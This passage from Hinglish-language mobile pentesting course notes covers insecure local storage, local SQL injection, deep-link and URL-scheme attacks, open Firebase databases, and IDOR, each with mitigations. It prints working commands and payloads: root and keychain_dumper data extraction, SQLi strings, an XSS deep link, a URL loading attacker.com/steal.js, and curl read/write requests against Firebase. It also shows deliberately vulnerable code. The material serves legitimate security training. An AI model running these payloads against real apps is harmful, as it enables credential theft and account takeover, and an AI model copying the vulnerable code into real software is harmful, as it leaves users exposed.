| **3. Kyu important?** (Attacker View) | **Bahut aasan hai.** Rooted phone par `/data/data/<pkg>/` folder mein jaakar `cat` command se seedha password padh sakte hain. | **Thoda mushkil hai.** Jailbroken phone par SSH karke app ke container (`/var/mobile/Containers/...`) mein jaana padta hai. Asli galti `Keychain` use *na* karna hai. |
| **4. Kab/Kahan?** (When/Where?) | **(Foundational)** Hamesha check karo. Rooted phone par `adb shell` se `/data/data/<pkg_name>/` folder ko explore karo. Khaas kar `shared_prefs/` aur `databases/` folders ko. | **(Foundational)** Hamesha check karo. Jailbroken phone par `Filza` ya SSH se app ka data container dhoondho. `Documents/`, `Library/Preferences/` folders check karo. |
| **5. Agar nahi kiya?** (Consequences) | **Critical Risk.** Attacker user ka `auth_token` ya `password` chura kar poora account hijack kar lega. Yeh P1/P2 bug hai. | **Critical Risk.** Attacker user ka `auth_token` ya `password` (`.plist` file se) chura lega. Agar data `Keychain` mein hota, toh woh (mostly) safe rehta. |
| **8. Common Mistakes** (Beginner) | `SQLite` file ko `cat` karke sochna ki kachra dikh raha hai. (Woh database hai, use `sqlite3` command se kholo). | Yeh sochna ki `Keychain` 100% unhackable hai. (Galat\! Jailbroken phone par `Keychain_dumper` jaise tool se data dump ho sakta hai, agar developer ne *galat* `kSecAttrAccessible` flag use kiya ho). |
| **9. Real-World Scenario** (How-To-Hack) | **Pentester:** App mein login karta hai. `adb shell` se `/data/data/com.app/shared_prefs/user.xml` ko `cat` karta hai. Output: `<string name="auth_token">TOKEN_123</string>`. 💥 (P1 Bug Report). | **Pentester:** App mein login karta hai. SSH se `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/com.app.plist` ko `cat` karta hai. Output: `<key>authToken</key><string>TOKEN_123</string>`. 💥 (P1 Bug Report). |
| **11. Key Questions (FAQs)** | *Q: Data encrypt karke rakhein toh?*<br>A: Kahan se laaye encryption key? Agar key bhi code mein hardcoded (M3.2) hai, toh bekaar hai. Hum key nikaal kar decrypt kar lenge. | *Q: Keychain best hai?*<br>A: Haan. Yeh iOS ki hardware-backed secure tijori hai. Data tabhi access hota hai jab phone unlocked ho (ya Face ID se). Hamesha ise use karna chahiye. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Android:**
          * Har app ka private folder hota hai: `/data/data/<package_name>/`.
          * **`shared_prefs/` (Shared Preferences):** Chhote data (settings, tokens, flags) ke liye XML files. Sabse common jagah password milne ki.
          * **`databases/` (SQLite):** Bade data (chat history, user info) ke liye database files.
          * **`files/`:** General files.
          * **`allowBackup="true"` (Insecure Backup):** Agar yeh Manifest mein `true` hai (M2.1), toh attacker `adb backup` (bina root ke) chala kar poora `/data/data/` folder (data, prefs, DBs) apne PC par nikaal sakta hai.
      * **iOS:**
          * Har app "sandbox" (jail) mein rehti hai. Uska data container yahan hota hai: `/var/mobile/Containers/Data/Application/<App_UUID>/`
          * **`Documents/`:** User ki banayi files.
          * **`Library/Preferences/`:** Yahan `<bundle_id>.plist` file hoti hai (Android ke `SharedPrefs` jaisi). Yeh `UserDefaults` API yahan data store karti hai. **Sensitive data yahan nahi hona chahiye.**
          * **`Library/Application Support/`:** Database (e.g., `CoreData` ki `model.sqlite`) yahan ho sakta hai.
          * **`tmp/`:** Temporary files.
          * **`Keychain` (The Secure Way):** Yeh ek alag, system-wide, encrypted database hai *sirf* secrets (passwords, keys, certs) ke liye. Data yahan rakhna chahiye.

7.  **💻 Code example / Command Example:**

      * **Android (Exploitation Commands):**

        ```bash
        # (Rooted phone par 'adb shell' ke andar)

        # 1. Root ban jao
        $ su

        # 2. App ke folder mein jao (e.g., DIVA app)
        # cd /data/data/jakhar.aseem.diva/

        # 3. Shared Preferences (XML files) check karo
        # cat shared_prefs/diva_prefs.xml

        # 4. Databases check karo
        # sqlite3 databases/userdetails.db
        sqlite> .tables
        sqlite> SELECT * FROM users;
        ```

      * **✍️ Line-by-line explanation (Android):**

          * `su`: "Switch User" to root (`#` prompt mil jaayega).
          * `cat shared_prefs/diva_prefs.xml`: `cat` command XML file ka content (jismein password/token ho sakta hai) seedha terminal par print kar deta hai.
          * `sqlite3 ...`: `sqlite3` command-line tool se database file ko kholta hai.
          * `.tables`: SQLite command: "Is database mein saare tables ki list dikhao."
          * `SELECT * FROM users;`: SQL command: "Users table ka *saara* data (passwords sahit) dikhao."

      * **iOS (Exploitation Tools):**

          * (Jailbroken phone par SSH se connect)
          * **Tool 1: `plutil` (Plist dekhne ke liye):**
            ```bash
            # (Phone ke shell mein)
            # plutil -p /var/mobile/Containers/.../Library/Preferences/com.vulnerable.app.plist
            ```
          * **Tool 2: `Keychain_dumper` (Keychain se data nikaalne ke liye):**
            ```bash
            # (GitHub se 'keychain_dumper' download karke phone par 'scp' se bhejo)
            # chmod +x keychain_dumper
            # ./keychain_dumper
            ```

      * **✍️ Line-by-line explanation (iOS):**

          * `plutil -p ...`: `.plist` (XML) file ko human-readable format mein print karta hai.
          * `./keychain_dumper`: Yeh script jailbroken phone par chalti hai aur Keychain se saare passwords/tokens (jo app ne store kiye thay) ko decrypt karke terminal par dump kar deti hai. (Yeh tabhi kaam karta hai jab app ne weak security flags `kSecAttrAccessibleAlways` use kiye hon).

8.  **✅ Quick checklist / Mitigation:**

      * **Android:**
          * Sensitive data (token, password) `Shared Preferences` mein *kabhi* store mat karo.
          * Android `Keystore` system ka istemaal karke data ko encrypt karke `SQLite` mein rakho.
          * `allowBackup="false"` hamesha Manifest mein set karo.
      * **iOS:**
          * Sensitive data (token, password) `UserDefaults` (`.plist` file) mein *kabhi* store mat karo.
          * Hamesha, hamesha, hamesha `Keychain` ka istemaal karo.
          * Keychain mein data daalte waqt strong accessibility flag (jaise `kSecAttrAccessibleWhenUnlocked`) ka istemaal karo.

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * **Android:** DIVA app ka "Insecure Data Storage" (1, 2, 3, 4) challenges complete karo. `adb shell` se `shared_prefs` aur `sqlite3` ka use karke passwords nikaalo.
      * **iOS:** DVIA (Damn Vulnerable iOS App) ka "Local Data Storage" challenge dekho. `Filza` (file manager) se app ke container mein jaakar uski `.plist` file dhoondho aur credentials nikaalo. Fir 'Keychain' challenge ko `keychain_dumper` se solve karo.

-----

## 5.3: Client-Side Injection: Local SQL Injection (Android)

1.  **🎯 Title / Short Summary:** App ke Andar SQL Injection 💉.

2.  **🤔 Kya hai? (What?):** Yeh ek aisi vulnerability hai jahan attacker (jiske paas phone hai) app ke local database (`SQLite`) mein (e.g., 'Search' ya 'Login' field se) malicious SQL query bhej kar data chura sakta hai ya authentication bypass kar sakta hai.

3.  **💡 Kyu important hai? (Why?):** Server-side SQLi jitna critical nahi hai (kyunki attacker ko phone par access chahiye), lekin yeh "exported components" (M5.4) ke saath milkar dangerous ho jaata hai. Agar ek 'exported' component (jise koi bhi app call kar sakti hai) vulnerable hai, toh malicious app uske zariye local SQLi karke app ka saara data (jaise chat history) chura sakti hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** `JADX` (Static Analysis) mein. Code mein `rawQuery()` ya `execSQL()` function dhoondho. Agar yeh function user ke input (e.g., `username.getText().toString()`) ko direct string "+" karke query bana raha hai, toh woh vulnerable hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap ek local data theft/logic bypass bug miss kar denge. Agar app (e.g., note-taking app) PIN se protected hai, toh attacker PIN field mein SQLi (`' OR '1'='1`) daal kar app ko unlock kar sakta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Vulnerable Flow:**
        1.  User app ke 'Login' field mein input daalta hai (e.g., `' OR '1'='1'`).
        2.  App ka Java code us input ko leta hai.
        3.  Java code ek "unsafe" query banata hai:
            \`String query = "SELECT \* FROM users WHERE pin = '" + userInput + "';"
        4.  Query ban jaati hai:
            `SELECT * FROM users WHERE pin = '' OR '1'='1';`
        5.  `OR '1'='1'` hamesha `true` hota hai. Database saare users return kar deta hai, aur app login kar deti hai (bina sahi PIN ke).
      * **Secure Flow (Parameterized Queries):**
        1.  User input daalta hai (`' OR '1'='1'`).
        2.  App "safe" (parameterized) query use karti hai:
            `String query = "SELECT * FROM users WHERE pin = ?;"`
        3.  App, user ke input ko query mein "parameter" (`?`) ki jagah bind karti hai.
        4.  Database, input ko "code" nahi, balki "data" (ek lambi string) maanta hai. Woh database mein `' OR '1'='1'` naam ka PIN dhoondhta hai.
        5.  Aisa koi PIN nahi milta. Login fail ho jaata hai. Attacker haar gaya.

7.  **💻 Code example / Command Example:**

      * **Vulnerable Java Code (JADX mein dikhega):**

        ```java
        // (App ka DatabaseHelper class)
        public boolean checkPin(String pin) {
            // 🐞 KHATRA! User input (pin) seedha query mein concatenate (joda) ho raha hai
            String query = "SELECT * FROM users WHERE pin_col = '" + pin + "'"; 
            
            SQLiteDatabase db = this.getReadableDatabase();
            Cursor cursor = db.rawQuery(query, null); // 🐞 rawQuery() hamesha khatre ki nishani hai
            
            if (cursor.getCount() > 0) {
                return true; // Login successful
            }
            return false;
        }
        ```

      * **✍️ Line-by-line explanation (Vulnerable):**

          * `String query = "... + pin + ..."`: Yahi asli galti hai. User ke input (`pin`) ko code ka hissa banaya jaa raha hai.
          * `db.rawQuery(query, null)`: Yeh unsafe query run kar di gayi.

      * **Secure Java Code (Parameterized Query):**

        ```java
        public boolean checkPin(String pin) {
            // ✅ SAFE! Hum '?' (placeholder) use kar rahe hain
            String query = "SELECT * FROM users WHERE pin_col = ?"; 
            
            SQLiteDatabase db = this.getReadableDatabase();
            
            // ✅ SAFE! Hum 'pin' ko 'selectionArgs' (parameter) ki tarah bhej rahe hain
            Cursor cursor = db.rawQuery(query, new String[]{ pin }); 
            
            if (cursor.getCount() > 0) {
                return true; 
            }
            return false;
        }
        ```

      * **✍️ Line-by-line explanation (Secure):**

          * `String query = "... = ?"`: Query mein placeholder (`?`) use kiya.
          * `db.rawQuery(query, new String[]{ pin })`: User input (`pin`) ko alag se (parameter array mein) bheja. Database ab ise data maanega, code nahi.

      * **Exploitation (App ke UI mein):**

          * App ke PIN field mein yeh type karo: `' OR '1'='1`

8.  **🐞 Common beginner mistakes:**

      * Har `rawQuery()` ko vulnerable samajhna. (Galat\! Agar `rawQuery()` ko parameterized (secure waala example) tareeke se use kiya hai, toh woh safe hai).
      * Is bug ki severity ko P1 (Critical) report karna. (Galat\! Yeh *local* SQLi hai. Iska impact tabhi P1/P2 hota hai jab yeh kisi `exported` component ke zariye (bina phone khole) exploit ho sake).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Attacker mere phone mein SQLi kaise karega? Phone toh mere paas hai."
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester (jiske paas phone hai) ek 'Secure Diary' app kholta hai jo PIN maangti hai.
        2.  Pentester, PIN ki jagah `' OR '1'='1'--` daalta hai.
        3.  App unlock ho jaati hai (PIN bypass).
        4.  Yeh "Broken Authentication" bug hai.
      * **😈 Real Attack Scenario (Criminal Perspective):**
        1.  Attacker `JADX` se dekhta hai ki app ka ek `exported` broadcast receiver hai (M5.4) jo `intent` se `note_id` leta hai.
        2.  Woh dekhta hai ki receiver `rawQuery("DELETE FROM notes WHERE id = " + note_id)` chalata hai (Vulnerable\!).
        3.  Attacker ek malicious app banata hai.
        4.  Victim (jiske phone mein diary app hai) malicious app ko install karta hai.
        5.  Malicious app ek `intent` bhejti hai jismein `note_id` ki value `"1 OR 1=1"` hai.
        6.  Diary app (background mein) query chalati hai: `DELETE FROM notes WHERE id = 1 OR 1=1`.
        7.  Boom\! 💥 Victim ki saari notes delete ho jaati hain.

10. **✅ Quick checklist / Mitigation:**

      * `JADX` mein `rawQuery` aur `execSQL` search karo.
      * Check karo ki user input (`.getText()`) query mein `+` se jud raha hai ya `?` (parameter) se.
      * **Fix:** Hamesha Parameterized Queries (`?` waala tareeka) ya `query()` (Android ka safe function) ka istemaal karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ka "Input Validation Issues - 2 (SQLi)" challenge lo.
      * "Search" field ka istemaal karke SQL injection se doosre users ka data (passwords) nikaalo. (Hint: `android` daalne se 'android' dikhta hai. `' OR '1'='1` daal kar dekho).

12. **📚 Further reading / commands / tools:**

      * **Tools:** `JADX-GUI`, `adb`.
      * **OWASP:** [M4: Insecure Authentication (Client-Side)](https://owasp.org/www-project-mobile-top-10/2016-risks/m4-insecure-authentication)

-----

## 5.4 & 5.5: Comparison: Platform Vulns (Android vs. iOS)

1.  **🎯 Title / Short Summary:** Platform ke Darwaaze (Android Deep Links vs. iOS URL Schemes) 🚪.
2.  **💡 Kyu important hai? (Why?):** Yeh woh 'darwaaze' hain jisse dusre apps (ya browser) aapki app ko khol sakte hain aur use data bhej sakte hain (e.g., `youtube://watch?v=123`). Agar app in 'darwaazo' se aaye data par andha vishwas karti hai, toh attacker ek simple link (`vulnerable-app://transfer?to=attacker&amount=1000`) bhej kar app se sensitive action karwa sakta hai.

-----

### ⭐ Comparison: Android vs. iOS Platform Vulns

| Pehlu (Aspect) | 🤖 Android (Exported, Deep Links, WebView) | 🍎 iOS (URL Schemes, Universal Links, WebView) |
| :--- | :--- | :--- |
| **2. Kya hai?** (What?) | **Exported Component:** (M2.1) Ek Activity/Service jise koi bhi app call kar sakti hai.<br>**Deep Link:** Ek `http://` link (jaise `app.com/profile`) jo app ko khol deta hai. | **URL Scheme:** Ek custom link (jaise `fb://profile`) jo app ko khol deta hai.<br>**Universal Link:** Ek `http://` link (jaise `app.com/profile`) jo app ko khol deta hai. |
| **3. Kyu important?** (Attacker View) | **Bada Attack Surface.** `Exported` components (jo Drozer se milte hain) logic bypass ke liye best hain. `Deep Links` se XSS/data leak ho sakta hai. | **Targeted Attack.** `URL Schemes` (jo Plist se milte hain) sabse common vector hain. Attacker ek malicious webpage bana kar `vulnerable-app://` link se data chori kar sakta hai. |
| **4. Kab/Kahan?** (When/Where?) | **Manifest (Static):** `android:exported="true"` dhoondho. `<intent-filter>` mein `http` scheme (`<data android:scheme="http" ...>`) dhoondho. | **Info.plist (Static):** `CFBundleURLSchemes` (URL Scheme) dhoondho. `Associated Domains` (Universal Link) dhoondho. |
| **5. Agar nahi kiya?** (Consequences) | Attacker ek malicious app se aapki `Exported` activity khol kar sensitive data chura sakta hai ya login bypass kar sakta hai. | Attacker victim ko `vulnerable-app://show_token` jaisa link (SMS/email se) bhej sakta hai, jise click karte hi victim ka auth token attacker ko mil jaayega (XSS/Data Leak). |
| **8. Common Mistakes** (Beginner) | Sirf `exported="true"` dhoondhna. (Yaad rakho: Agar `<intent-filter>` hai, toh `exported="true"` *default* (Android \< 12) maana jaata tha\!). | Har URL scheme ko bug samajhna. (Bug *scheme* nahi, usse aaye *data* ko galat handle karna hai). |
| **9. Real-World Scenario** (How-To-Hack) | **Pentester:** Drozer se (M4.2) `run app.activity.start --component com.app .SecretActivity` chalata hai. Login bypass ho jaata hai. **(Exported Component)** | **Pentester:** Plist mein `vulnapp://` dekhta hai. JADX/Ghidra se dekhta hai ki `vulnapp://webview?url=...` link seedha WebView mein khulta hai. Woh victim ko `vulnapp://webview?url=http://attacker.com/steal.js` link bhejta hai. Click karte hi (Local File Access / XSS) ho jaata hai. **(Insecure URL Scheme)** |
| **11. Key Questions (FAQs)** | *Q: Deep Link vs. App Link?*<br>A: `Deep Link` (http) ko handle karne ke liye 10 app ho sakti hain (OS poochhta hai). `App Link` (http) verified hota hai (sirf *aapki* app khulti hai). | *Q: URL Scheme vs. Universal Link?*<br>A: `URL Scheme` (fb://) custom hai, secure nahi. `Universal Link` ([https://facebook.com](https://facebook.com)) standard http link hai jo verified (secure) hota hai. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (WebView):**

      * **WebView:** Yeh app ke andar ka chhota 'browser' hai jo webpage dikhata hai.
      * **Android (Insecure WebView):**
          * **Khatra 1:** `setJavaScriptEnabled(true)` (Default `false`): Agar yeh ON hai, toh webpage (jo app dikha rahi hai) JavaScript chala sakta hai.
          * **Khatra 2:** `addJavascriptInterface(...)`: Yeh JavaScript ko Java (app ka code) call karne ki power deta hai. 🤯 Attacker (agar XSS dhoondh le) `window.MyJavaInterface.stealData()` call karke app se data chura sakta hai.
          * **Khatra 3:** `setAllowFileAccess(true)` (Default `true`): WebView `file:///` (phone ki local files) ko access kar sakta hai. Agar `url` parameter (jaisa iOS example mein tha) vulnerable hai, toh attacker `file:///data/data/com.app/shared_prefs/user.xml` load karke password padh sakta hai.
      * **iOS (Insecure WebView):**
          * `WKWebView` (naya) `UIWebView` (purana) se zyada secure hai.
          * `WKWebView` mein JavaScript by default ON hota hai, lekin uska `JavaScriptBridge` (Android jaisa) safe hota hai.
          * Asli khatra `URL Scheme` se aaye 'untrusted' URL ko seedha WebView mein load karne se hota hai (jaisa Real-World Scenario mein bataya).

7.  **💻 Code example / Command Example:**

      * **Android (Exploiting Deep Link):**

        ```bash
        # (PC ke terminal se, jab app installed ho)

        # 1. Manifest mein deep link (http://vulnerable.com/user) mila
        # 2. Hum (attacker) use 'adb' se trigger karenge aur XSS payload bhejenge

        adb shell am start -W -a android.intent.action.VIEW \
            -d "http://vulnerable.com/user?name=<script>alert('XSS')</script>" \
            com.vulnerable.app
        ```

      * **✍️ Line-by-line explanation (Android):**

          * `adb shell am start ...`: Activity Manager ko bolta hai ki ek activity (screen) kholo.
          * `-a ...ACTION_VIEW`: "kuch dekho" (default action jab link click hota hai).
          * `-d "http://...<script>..."`: Data (link) yeh hai. Humne URL mein hi XSS payload (`<script>`) daal diya.
          * **Result:** Agar app is `name` parameter ko bina sanitize kiye WebView mein dikhaati hai, toh app ke andar "XSS" ka popup aa jaayega.

      * **iOS (Exploiting URL Scheme):**

        ```bash
        # (PC ke terminal se, jab app installed ho aur phone connected)
        # (Requires 'libimobiledevice' tool)

        # 1. Plist mein URL scheme (vulnapp://) mili
        # 2. Hum (attacker) use 'ideviceopenurl' se trigger karenge

        ideviceopenurl "vulnapp://load?url=http://attacker.com/steal.js"
        ```

      * **✍️ Line-by-line explanation (iOS):**

          * `ideviceopenurl "..."`: Jailbroken/non-jailbroken phone par bolta hai ki "Safari mein yeh link kholo." iOS (OS) `vulnapp://` ko pehchaan lega aur link `vulnapp` (hamari app) ko bhej dega.
          * **Result:** Agar app `url` parameter ko andhe hoke WebView mein load karti hai, toh attacker ka JavaScript (steal.js) app ke context mein run ho jaayega.

8.  **✅ Quick checklist / Mitigation:**

      * **Android:**
          * `Exported` components (Activity, Service, Provider) ko hamesha `exported="false"` rakho (jab tak zaroori na ho).
          * WebView mein `setAllowFileAccess(false)` aur `addJavascriptInterface` (kam se kam) use karo.
          * Deep Link se aaye data ko *hamesha* sanitize karo.
      * **iOS:**
          * `URL Scheme` se aaye data (parameters) ko *kabhi* trust mat karo. Use hamesha validate/sanitize karo.
          * Old `UIWebView` ke bajaye naya `WKWebView` use karo.
          * `Universal Links` (jo verified hote hain) ko `URL Schemes` par prefer karo.

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * **Android:** DIVA app ka "Access Control Issues - 1" (Exported Activity) Drozer/ADB se exploit karo.
      * **Android:** DIVA ka "Input Validation - 3 (WebView)" challenge dekho. XSS aur File Access (`file:///`) try karo.
      * **iOS:** DVIA ka "Insecure URL Scheme" challenge lo. Dekho ki kaise woh 'Login' screen ko bypass kar deta hai.

-----

## 5.6: Backend Vulns: Firebase Misconfiguration

1.  **🎯 Title / Short Summary:** Google ka Open Database (Firebase) ☁️🔥.

2.  **🤔 Kya hai? (What?):** Firebase (Google ka backend platform) ek real-time NoSQL database hai. "Misconfiguration" tab hoti hai jab developer database ke "Security Rules" ko `public` (open) chhod deta hai. (e.g., `".read": "true"`, `".write": "true"`).

3.  **💡 Kyu important hai? (Why?):** Agar Firebase DB open hai, toh koi bhi (jise "database URL" pata hai) browser se seedha poora database (saare users ka data, passwords, chats) padh (`read`) sakta hai ya usmein data badal (`write`) sakta hai. Yeh P1 (Critical) bug hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** `JADX` (Static Analysis) mein. `https://` ke saath `.firebaseio.com` waala URL dhoondho. Har app jo Firebase use karti hai, usmein yeh URL hardcoded (M3.2) hota hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap poora server (database) hack karne ka mauka chhod denge. Yeh client-side (app) bug nahi hai, yeh *backend* bug hai jo app ke code se milta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Firebase Database URL:** Har Firebase DB ka ek unique URL hota hai, jaise `https://vulnerable-app-12345.firebaseio.com`.
      * **Security Rules:** Developers ko JSON format mein rules likhne padte hain ki kaun (`auth != null` matlab sirf logged-in user) data padh/likh sakta hai.
      * **Vulnerable Rule (Open):**
        ```json
        {
          "rules": {
            ".read": "true", // Koi bhi padh sakta hai
            ".write": "true" // Koi bhi likh sakta hai
          }
        }
        ```
      * **Secure Rule (Locked):**
        ```json
        {
          "rules": {
            "users": {
              "$uid": { // Sirf woh user...
                ".read": "$uid == auth.uid", // ...jo khud ka data...
                ".write": "$uid == auth.uid" // ...padh/likh sakta hai.
              }
            }
          }
        }
        ```
      * **Exploitation:**
        1.  `JADX` se URL (`https://vulnerable-app-12345.firebaseio.com`) nikaalo.
        2.  Browser kholo, URL ke aage `.json` lagaao.
        3.  `https://vulnerable-app-12345.firebaseio.com/.json`
        4.  Agar `".read": "true"` hai, toh poora database JSON format mein browser par dikh jaayega.
        5.  (Agar `".write": "true"` hai) `curl` (PC command) se data badal do.

7.  **💻 Code example / Command Example:**

      * **Static Analysis (JADX mein dhoondhna):**

          * `JADX` kholo -\> `Ctrl+Shift+F` (Text Search) -\> `firebaseio.com`
          * Aapko code milega:
            `String url = "https://vulnerable-app-12345.firebaseio.com";`
            `FirebaseDatabase.getInstance(url);`

      * **Exploitation (PC Terminal/Browser):**

        ```bash
        # 1. Read (Padhna): URL ko browser mein kholo ya 'curl' use karo
        curl "https://vulnerable-app-12345.firebaseio.com/.json"

        # 2. Write (Likhna): 'curl' se data 'PUT' (overwrite) karo
        curl -X PUT -d '{"hacked": "true", "new_admin": "attacker"}' \
            "https://vulnerable-app-12345.firebaseio.com/users/attacker.json"
        ```

      * **✍️ Line-by-line explanation (Exploitation):**

          * `curl "..../.json"`: Browser mein URL ke aage `.json` lagaane jaisa hai. Yeh Firebase ko bolta hai "saara data JSON mein do."
          * `curl -X PUT -d '{"...":"..."}' "..."`: HTTP `PUT` request bhejta hai. `-d` (data) mein hum apna JSON payload (`hacked: true`) bhej rahe hain. Hum `users/` collection ke andar `attacker` naam ka naya user bana rahe hain.

      * **🚀 Quick run expected output:**

          * `curl` (read) command chalane par, poora database (saare users ka data) aapke terminal par print ho jaayega.

8.  **🐞 Common beginner mistakes:**

      * Sirf `.json` (read) check karna. Hamesha `.write` (likh paana) bhi check karo. `curl -X PUT` se ek 'test' node (`/test.json`) bana kar dekho.
      * URL milte hi P1 report kar dena. (Galat\! URL milna bug nahi hai, URL ka *public* (open) hona bug hai). Pehle `.json` laga kar check karo ki data padh paa rahe ho ya nahi.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "Main app se poora server database kaise nikaal sakta hoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester `JADX` mein `firebaseio.com` search karta hai.
        2.  Use `https://chat-app-prod.firebaseio.com` URL milta hai.
        3.  Woh browser mein `https://chat-app-prod.firebaseio.com/.json` kholta hai.
        4.  Poora database (saare users ki chat history, phone numbers, auth tokens) browser mein load ho jaata hai.
        5.  Pentester P1 (Critical) bug file karta hai: "Misconfigured Firebase DB (Public Read Access) leaks all user data."
      * **💰 Real Bug Bounty Example:** Yeh *bahut* common bug hai. 2018 mein ek report aayi thi ki 100,000+ Android aur iOS apps (jinmein 113 million users thay) ka Firebase DB public tha, jisse user passwords, PII, aur GPS data leak ho raha tha.

10. **✅ Quick checklist / Mitigation:**

      * `JADX` mein `.firebaseio.com` URL dhoondho.
      * URL ke aage `.json` laga kar browser mein check karo.
      * `curl -X PUT` se `.write` access check karo.
      * **Fix:** Developers ko Firebase Console mein jaakar Security Rules ko `".read": "auth != null"` (sirf logged-in user) aur `".write": "auth.uid == $userId"` (sirf user apna data) par set karna chahiye.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Internet par "Vulnerable Firebase App" (GitHub) dhoondho (ya DVIA mein check karo).
      * Us app ko `JADX` mein reverse karke uska Firebase URL nikaalo.
      * Browser mein `.json` laga kar uske data ko padhne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `JADX-GUI`, `curl`.
      * **Keywords:** `firebaseio.com`, Firebase Security Rules.

-----

Module 5 complete\! 🏁 Humne app ki local "tijori" (Storage) todna seekh liya hai aur platform ke 'darwaaze' (Deep Links, URL Schemes) se ghusna bhi seekh liya hai. Humne Firebase (backend) ko bhi hack kar liya.

Client-side par humne lagbhag sab cover kar liya hai. Ab hum 'asli goldmine' 💰 ki taraf badhenge. Jab aap ready hon, toh batana. Hum **Module 6: Core Vulns - The Backend API** shuru karenge, jahan 90% critical bugs (IDOR, BOLA) milte hain\!

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 6\! 🚀

Yeh module "The Real Goldmine" 💰 hai. Module 5 tak hum app ke andar (client-side) khel rahe thay. Ab hum app ke dimaag, yaani uske **Backend API** (server) par attack karenge. Yahi woh jagah hai jahan 90% critical bugs (jaise doosre user ka data dekhna, admin ban jaana) milte hain. Yahan hum Burp Suite ko apna sabse bada hathiyaar banayenge.

-----

## 6.1: API Hacking: IDOR (Insecure Direct Object Reference)

1.  **🎯 Title / Short Summary:** Mera Data -\> Tera Data (IDOR) 👤. Sirf ID badal kar kisi doosre user ka data (profile, orders, messages) dekhna ya badalna.

2.  **🤔 Kya hai? (What?):** IDOR ek access control vulnerability hai jahan server *sirf* ek "ID" (jaise `user_id=123` ya `order_id=456`) par bharosa karke data dikha deta hai, yeh check kiye bina ki data maangne waala user (aap) us data ka asli maalik hai ya nahi.

3.  **💡 Kyu important hai? (Why?):** Yeh API hacking ka sabse common aur sabse high-impact bug hai. Isse aap seedha-seedha doosre users ka personal data (PII) chura sakte hain, unke account modify kar sakte hain, ya unke orders delete kar sakte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Foundational)** Yeh *har uss* API request mein check karna hai jo URL, body, ya header mein koi "ID" bhej rahi ho.
      * **Jagah:** `Burp Suite Repeater`.
      * **Request Example:**
          * `GET /api/v1/users/`**`101`** (Aapka profile)
          * `POST /api/v1/profile/update` (Body mein: ` {"user_id":  `**`101`**`}`)
          * `GET /api/v1/orders?order_id=`**`456`**
      * **Galti:** Server ki galti yeh hai ki woh *check nahi karta* ki `token` (jo user `101` ka hai) user `102` ka data maangne ka haq rakhta hai ya nahi.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * **Data Breach:** Aap (user `101`) ID ko `102`, `103`, `104`... karke (brute-force) company ke *saare* users ka data (naam, email, phone, address) chori kar sakte hain.
      * **Account Takeover:** Agar `POST /api/profile/update` vulnerable hai, toh aap ID `102` bhej kar *doosre user* ka password ya email badal sakte hain aur uska account hijack kar sakte hain.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Step 1: Apne Account se Login karo (Attacker Account).** Maan lo aapki `user_id` hai `500`.
      * **Step 2: Doosra Account banao (Victim Account).** Maan lo uski `user_id` hai `501`. (Bug bounty mein, aapko hamesha 2 account banane chahiye).
      * **Step 3: App mein koi action karo.** Jaise, apna profile dekho. Burp mein request capture karo.
      * **Step 4: Request ko Burp Repeater mein bhejo.** Request aisi dikhegi:
        `GET /api/v2/get_profile?user_id=500`
        `Authorization: Bearer <token_of_user_500>`
      * **Step 5: ID badlo.** `user_id=500` ko badal kar `user_id=501` (victim ki ID) kar do. Token *wahi* (user 500 ka) rehne do.
      * **Step 6: Request send karo.**
          * **Result 1 (Secure):** Server `{"error": "Unauthorized", "status": 403}` (ya `401`) bhejega. (Matlab server ne check kar liya. No Bug).
          * **Result 2 (Vulnerable - IDOR\!):** Server `{"username": "victim", "email": "victim@email.com", ...}` (user 501 ka data) bhej dega. (Matlab server ne check nahi kiya. 💥 Bug Mil Gaya\!).

7.  **💻 Code example / Command Example:**

      * **Exploitation (Burp Repeater Request):**

        ```http
        # 1. Aap (attacker, ID: 123) login hain. Aapne Burp Repeater mein...
        # ...apni profile request (ID: 123) ko badal kar victim ki ID (124) daal di.

        GET /api/v1/users/124 HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer <attacker_token_for_user_123> 
        ```

      * **✍️ Line-by-line explanation:**

          * `GET /api/v1/users/124`: Hum (attacker) victim (`124`) ka data maang rahe hain.
          * `Authorization: Bearer <attacker_token_for_user_123>`: Lekin hum token (pehchaan patra) apna (`123`) hi bhej rahe hain.

      * **🚀 Quick run expected output (Vulnerable):**

          * Server `200 OK` dega aur *victim* (124) ka data JSON mein aa jaayega.

        <!-- end list -->

        ```json
        {
          "id": 124,
          "username": "victim_user",
          "email": "victim@example.com",
          "credit_card_hash": "..."
        }
        ```

      * **Vulnerable Server Code (Node.js/Express):**

        ```javascript
        // 🐞 KHATRA: Server sirf URL se 'id' le raha hai.
        app.get('/api/v1/users/:id', (req, res) => {
          const userId = req.params.id; 
          // Yeh check nahi kiya ki logged-in user (req.user.id) kaun hai
          db.users.find(userId, (user) => {
            res.json(user); // Seedha data bhej diya
          });
        });
        ```

      * **Secure Server Code (Node.js/Express):**

        ```javascript
        // ✅ SAFE: Server URL se 'id' bhi le raha hai aur 'token' se logged-in user (req.user.id) bhi.
